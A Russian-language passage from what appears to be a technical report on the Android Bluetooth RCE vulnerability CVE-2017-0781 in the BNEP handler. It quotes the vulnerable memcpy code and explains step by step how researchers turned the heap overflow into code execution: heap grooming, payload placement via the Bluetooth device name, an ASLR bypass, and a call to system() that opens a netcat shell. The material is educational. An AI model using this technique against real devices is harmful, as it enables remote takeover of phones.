Таким образом, **BNEP** по сути представляет адаптированную под Bluetooth версию **Ethernet**. Также **BNEP** поддерживает специальное **контрольное сообщение** для облегчения **PAN** соединения и обеспечения надежности соединения. Его формат представлен на рисунке 2.3.2

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_3_2.jpg)

**Рисунок 2.3.2** формат контрольного сообщения **BNEP**

Для включения нескольких контрольных сообщений в пакет низлежащего **L2CAP** протокола, в заголовок **BNEP** может быть также добавлено **расширение**. Его структура представлена на рисунке 2.3.3

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_3_3.jpg)

**Рисунок 2.3.3** формат расширения заголовка **BNEP**

В расширение выставляется бит **E**, который указывает на начало нового контрольного сообщения.

В Bluetooth стеке Android найдены две **RCE** уязвимости, основанные на неправильной обработке контрольных сообщений.

### Android RCE уязвимость #1 (CVE-2017-0781)

Данная уязвимость возникает из-за некорректного вызова функции **memcpy** в обработчике **BNEP** сообщения:
```c++
UINT8 *p = (UINT8 *)(p_buf + 1) + p_buf->offset;
...
type = *p++;
extension_present = type >> 7;
type &= 0x7f;
...
switch (type)
{
...
// если получили контрольное сообщение
case BNEP_FRAME_CONTROL:
    ctrl_type = *p;
    // обрабатываем контрольное сообщение
    p = bnep_process_control_packet (p_bcb, p, &rem_len, FALSE);
    // если следующие контрольные сообщения нужно
    // обработать в режиме CONNECTED, а текущее состояние IDLE
    if (ctrl_type == BNEP_SETUP_CONNECTION_REQUEST_MSG && p_bcb->con_state != BNEP_STATE_CONNECTED &&
extension_present && p && rem_len)
{
    // сохранение необработанного контрольного
    // сообщения до тех пор, пока
    // не произойдет аутентификация
    p_bcb->p_pending_data = (BT_HDR *)osi_malloc(rem_len);
    memcpy((UINT8 *)(p_bcb->p_pending_data + 1), p, rem_len);
    ...

}
...
```
Выдержка из исходного кода функции **bnep_data_ind** в стеке Bluedroid

Фрагмент исходного кода, приведенный выше, отражает процесс обработки приходящих контрольных сообщений. *BNEP_FRAME_CONTROL* - тип контрольного сообщения. Приведенная ветка switch-case - попытка обработать следующую ситуацию: так как несколько контрольных сообщений могут содержаться в одном **L2CAP** пакете (используя бит **E**), состояние **BNEP** соединения может меняться в зависимости от каждого контрольного сообщения. Если, например, поле *SETUP_CONNECTION_REQUEST* выставлено в первом контрольном сообщении, следующие контрольные сообщения могут ожидать обработки в состоянии *CONNECTED* (не в начальном - *IDLE*). Но переключение в состояние *CONNECTED* требует процесса аутентификации. Так как этот процесс происходит асинхронно, возможна ситуация, что обработка контрольных сообщений все еще будет происходить в состоянии *IDLE*. Решение этой проблемы состоит в том, чтобы обрабатывать контрольные сообщения позже, когда уже гарантированно переключились в состояние *CONNECTED*.

Поэтому обработчик сохраняет оставшееся необработанное сообщение для использования в дальнейшем (в *p_pending_data*). Здесь и возникает ошибка. Сначала память для буфера *p_pending_data* (размер - *rem_len*) выделена в куче. Затем в участок памяти по адресу *p_pending_data* **+ 1** копируется сообщение размером *rem_len*. Поэтому каждый раз **memcpy** будет переполнять буфер на sizeof(*p_pending_data*) байтов. Вдобавок к этому, буфер *p_pending_data* еще и никогда не освобождается. Поэтому существует вероятность обращения к недоступной процессу памяти (**SIGSEGV**). Вполне вероятно, этот участок кода никогда не используется в реальных условиях.

Поле *p_pending_data* имеет размер 8 байтов. Переменная, *rem_len*, контролирующая размер выделенной памяти, находится под влиянием атакующей стороны, так как это длина оставшихся необработанных байтов пакета, а переменная *p*, так как указывает на отправленный атакующим пакет.

Возможна ситуация переполнения буфера, с помощью специально подготовленного для этого пакета. Его формат показан на рисунке 2.3.4

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_3_4.png)

**Рисунок 2.3.4** формат специального пакета для переполнения буфера

Поле *type* состоит из установленного бита **E** и типа *BNEP_FRAME_CONTROL* (0x01) => (0x81). Поле *ctrl_type* установлено в *BNEP_SETUP_CONNECTION_REQUEST_MSG* (0x01) для воспроизведения вышеописанной ситуации и вызова **memcpy**. Overflow payload отвечает как раз за само переполнение. Также, так как возможно сформировать пакет любой длины, атакующая сторона может контролировать размер выделенной с помощью **osi_malloc** памяти, так как *rem_len*, как было показано выше, находится под влиянием атакующего.

### Эксплутация RCE уязвимости CVE-2017-0781

В этом разделе вместо исходного кода эксплойта будет разобрано, как исследователи нашли вариант использования данной уязвимости. Данный эксплойт будет пытаться запустить управляемую shell-оболочку на атакуемом девайсе (через функции в библиотеке libc.so). При исследовании уязвимости разработчиками был выбран девайс на Android 7.1.2

Неважно, какой разрядности будет атакуемое устройство, так как процесс Bluetooth является 32-битным, соответственно использует 32 битное адресное пространство.

Процесс исследования эксплуатации состоит из следующих шагов:
- Найти участок кода, в который будет легко попасть атакующеей стороной и который будет выделять память под буфер с указателем на некоторую функцию
- Найти участок кода, который будет записывать контролируемые атакующим полезные данные в определенную область памяти, имеющую некий абсолютный адрес (пока **ASLR** в расчет не берется)
- Найти способ повлиять на кучу (heap). В данном случае необходимо, чтобы память под *p_pending_data* была выделена прямо перед буфером из первого шага  
- Воспользоваться SDP уязвимостью утечки памяти для обхода **ASLR** и нахождения базовых адресов некоторых shared-библиотек

##### Выбор объекта, в который будут записываться полезные данные
----------------------------------------------------------------
Сначала попробуем послать много специальных пакетов (структура была показана на рисунке 2.3.4), так как данная уязвимость, как было показано в предыдущем разделе, всегда формирует **SIGSEGV** (обращение к памяти, к которой процесс доступа не имеет), демон Bluetooth экстренно завершает свою работу после получения большого количества специальных пакетов. В случае с используемым устройством, это были 500-1000 пакетов. Пакеты посылались через **L2CAP** соединение на **PSM** (идентификатор сервиса) с номером 15, то есть сервису **BNEP**. На рисунке 2.3.4 показаны логи, выводимые устройством-жертвой в результате атаки.

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_3_5.png)

**Рисунок 2.3.5** выдержка из логов атакуемого устройства

На рисунке 2.3.6 показано место в отладчике, где возникает **SIGSEGV**.

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_3_6.jpg)

**Рисунок 2.3.6** выдержка анализируемого процесса из отладчика (ассемблер **ARM**)

Как видно из отладчика, это место находится в функции **btu_hci_msg_process**.

```c++
// можно сказать, что p_msg - указатель
// на переданную дейтаграмму
static void btu_hci_msg_process(BT_HDR *p_msg) {
    // определяем тип полученного сообщения
    switch (p_msg->event & BT_EVT_MASK)
    {
        case BTU_POST_TO_TASK_NO_GOOD_HORRIBLE_HACK: 
        ((post_to_task_hack_t *)(&p_msg->data[0]))->callback(p_msg);
        break;
...
```
Исходный код функции *btu_hci_msg_process*

Аварийное завершение процесса возникает при обращении к *p_msg->event* (оно же - первая красная строка на рисунке 2.3.6, в регистре R4 - адрес *p_msg*). Поле **event**- первое в структуре **BT_HDR**, то есть в структуре буфера данных Bluetooth пакета. Следовательно, атакующий получает контроль над указателем *p_msg* в данной ситуации, как видно из логов, где в регистре R4 хранится значение *0x41414141*.

Рассмотрим тип события *BTU_POST_TO_TASK_NO_GOOD_HORRIBLE_HACK* (*0x1700* в отладчике - зеленое поле на рисунке 2.3.6). По всей видимости, для этого типа события первые байты поля **data** (смещение 8 в *p_msg*) - указатель на функцию, которая вызывается с параметром *p_msg* (будет показано далее).

Также заметим, что в логах в стеке хранится адрес следующей функции:
```c++
void btu_task_start_up(void *context) {
...
    fixed_queue_register_dequeue(btu_hci_msg_queue, thread_get_reactor(bt_workqueue_thread), btu_hci_msg_ready, NULL);
...
}
```
Функция, регистрирующая *btu_hci_msg_queue*

```c++
void btu_hci_msg_ready(fixed_queue_t *queue, void *context) {
    BT_HDR *p_msg = (BT_HDR *)fixed_queue_dequeue(queue);
    btu_hci_msg_process(p_msg);
}
```
Обработчик приходящих сообщений *hci msgs* в **btu_hci_msg_queue**

Функция **btu_hci_msg_ready** регистрирует **btu_hci_msg_process** как обработчик для любых сообщений, приходящих в *btu_hci_msg_queue*. В эту очередь приходят все сообщения от Bluetooth-контроллера через низкоуровневый протокол **HCI**. Поэтому все пакеты атакующего будут упорядочены. "Horrible hack" в функции **btu_hci_msg_process**, показанной выше - резервирование этой очереди для разных типов сообщений, имеющих callback (функцию-отклик на некоторое событие).

Исследуя исходный код далее, приходим к непосредственному месту, в котором возникнет переполнение (и далее - **SIGSEGV**):
```c++
void *fixed_queue_dequeue(fixed_queue_t *queue) {
    ...
    void *ret = list_front(queue->list);
    list_remove(queue->list, ret);
    ...
    return ret;
}
```
Переполнение выделенного буфера

Поле **list** представляет собой связный список **list_node_t**, приведенный ниже:
```c++
struct list_node_t {
    struct list_node_t *next;
    void *data;
};
```
Определение структуры **list_node_t**

Память в месте, где обнаружена уязвимость, выделяется через функцию **osi_malloc**, используемой оберткой **jemalloc** от Android. Эта функция размещает одинаковые по длине блоки в непрерывно идущие области памяти. Так как *p_pending_data*, который мы собираемся перезаписывать, имеет длину 8 байтов, как и объект **list_node_t**, очень вероятно, что они размещены в памяти последовательно.

В ситуации с аварийным завершением Bluetooth-процесса, **list_node_t** был перезаписан со значением *0x41414141*. Затем его поле **data** преобразуется к типу **BT_HDR** (переменная *p_msg*) и передается в обработчик **btu_hci_msg_process**.

Дальнейший анализ показал, что где-то в 80% случаев завершения процесса переполнение было вызвано записью в объект **list_node_t**.

Таким образом, чтобы эксплуатировать переполнение, нам нужно множество объектов **list_node_t** со свободными промежутками между ними, чтобы повысить шансы, что память под *p_pending_data* будет выделена рядом с узлом связанного списка, что достигается отправлением большого количества специальных пакетов. Каждый из пакетов попадает в функцию **btu_hci_msg_queue** как объект узла списка и в дальнейшем будет обработан функцией, где обнаружена уязвимость.

Эксплойту требуется знать адрес в памяти, который будет содержать полезные данные до переполнения. Этот адрес будет записан в поле **data** узла списка, используя 8-байтное переполнение, описанное выше. По этому адресу будут записаны байты, приведенные на рисунке ниже.

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_3_7.png)
**Рисунок 2.3.7** адрес, содержащий дополнительные данные для эксплойта

Также будут записаны адрес **libc_system** (функция **system()**, выполняющая переданные ей команды оболочки) в поле адреса функции-отклика (callback) на событие *0x2217414141414141* и дополнительные bash-команды. При удачной атаке, данные должны интерпретироваться, как вызов **system()** со следующими аргументами: 

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_3_8.png)

**Рисунок 2.3.8** аргументы, переданные **system()**

Чтобы запустить управляемую оболочку, используется утилита **toybox nc** (аналог **netcat**).

#### Запись полезных данных в память
------------------------------------------

Данные на рисунке 2.3.7 должны быть помещены в определенную область памяти. Анализ исходного кода  стека Bluedroid показывает, что многие структуры данных, связанные с активными Bluetooth соединениями расположены в неких глобальных структурах. Это означает, что они расположены в секциях **bss** и данных. Смещения в секции **bss** - константы времени компиляции программы. Единственный неопределенный заранее параметр (из-за **ASLR**), влияющий на такие смещения - базовые адреса исполнительных секций. Рисунок 2.3.9 показывает, как относительно друг друга расположены секции **bss** и данных.  

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_3_9.jpg)

**Рисунок 2.3.9** типичная структура памяти программы

В этих секциях располагаются такие данные, как например имя Bluetooth устройства, которые могут изменяться, как показано на рисунке 2.3.10

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_3_10.jpg)

**Рисунок 2.3.10** изменение имени Bluetooth устройства

Этим именем устройства обмениваются через низлежащий относительно **L2CAP** протокол **ACL**. Спецификация имени устройства представлена на рисунке 2.3.11

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_3_11_1.jpg)
![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_3_11_2.jpg)

**Рисунок 2.3.11** выдержка из документации Bluetooth

Структуры данных, содержащие имя Bluetooth устройства:

```c++
typedef struct
{
    ...
    tACL_CONN acl_db[MAX_L2CAP_LINKS];
    ...
} tBTM_CB;

typedef struct
{
    ...
    BD_NAME remote_name;
    ...
} tACL_CONN;
```

Структура **tBTM_CB** расположена в секции **bss** процесса Bluetooth. Следовательно имеет заранее определенное смещение. По аналогии, остальные данные, используемые Bluetooth соединением, тоже имеют независимый относительный адрес.

Как было показано на первом шаге, необходимо расположение данных в куче как показано на рисунке 2.3.12

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_3_12.png)

**Рисунок 2.3.12** нужное расположение данных в куче

Видно, что 8-байтный буфер с полезной информацией находится прямо перед узлом связанного списка. Но если просто посылать пакеты жертвы, мы не достигнем нужного расположения. Что будет на самом деле в куче показано на рисунке 2.3.13 

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_3_13.png)

**Рисунок 2.3.13** как данные в куче будут располагаться на самом деле

Когда пакеты придут на устройство жертвы, выделится память под узлы связанного списка. Затем они будут обрабатываться **bnep_data_ind** (функцией, в которой обнаружена уязвимость). Память под буферы *p_pending_data* будет выделена уже после узлов списка. Таким образом, при переполнении нужная для полезных данных область памяти (узлы) останется нетронутой из-за того, что перед узлами заранее не было выделенной памяти. Эти "дыры" в памяти могут образоваться только после освобождения памяти под узлы списка, но маловероятно, что каждая "дыра" будет образовываться перед каждым узлом. На рисунке 2.3.14 показано, как освобожденные области будут располагаться относительно узлов списка. 

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_3_14drawio.png)

**Рисунок 2.3.14** как в куче будут располагаться освобожденные области

Существует способ, позволяющий расположить свободные места в памяти **между** необработанными узлами. 

